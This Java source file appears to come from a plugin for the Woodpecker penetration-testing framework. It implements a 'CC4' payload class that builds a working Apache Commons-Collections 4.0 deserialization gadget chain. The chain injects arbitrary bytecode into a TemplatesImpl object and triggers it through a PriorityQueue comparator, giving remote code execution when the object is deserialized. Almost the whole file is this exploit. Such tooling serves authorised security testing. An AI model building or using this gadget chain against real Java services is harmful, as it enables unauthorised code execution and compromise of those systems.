package me.gv7.woodpecker.plugin.gadgets.bytecode;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import me.gv7.woodpecker.plugin.annotation.DependenciesVersion;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.util.Comparator;
import java.util.PriorityQueue;

import static me.gv7.woodpecker.plugin.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-4.0")
@RequireParameter("ResourcePath")
public class CC4 implements ObjectPayload {
    @Override
    public <T> Object getObject(Input input) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{input.getBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());


        ConstantTransformer fakeformer = new ConstantTransformer(1);

        InstantiateTransformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj});

        Comparator comparator = new TransformingComparator(fakeformer);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(TrAXFilter.class);
        queue.add(TrAXFilter.class);

        setFieldValue(comparator,"transformer",transformer);
        return queue;
    }

//    public static byte[] getBytecode(final Class classname) throws NotFoundException, IOException, CannotCompileException {
//        ClassPool pool = ClassPool.getDefault();
//        CtClass clazz =
//                pool.get(classname.getName());
////        JavaClass cls = Repository.lookupClass(classname);
////        byte[] bytes = cls.getBytes();
//        byte[] bytes = clazz.toBytecode();
//        return bytes;
//    }
}

